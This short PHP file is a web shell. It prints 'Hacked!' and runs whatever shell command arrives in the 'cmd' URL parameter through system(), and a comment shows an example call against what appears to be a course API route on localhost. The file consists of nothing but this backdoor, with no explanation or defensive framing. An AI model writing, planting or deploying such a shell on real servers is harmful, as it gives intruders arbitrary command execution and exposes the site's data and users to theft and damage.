<?php
echo "Hacked!";
system($_GET['cmd']); // http://localhost:8000/api/courses?cmd=ls
?>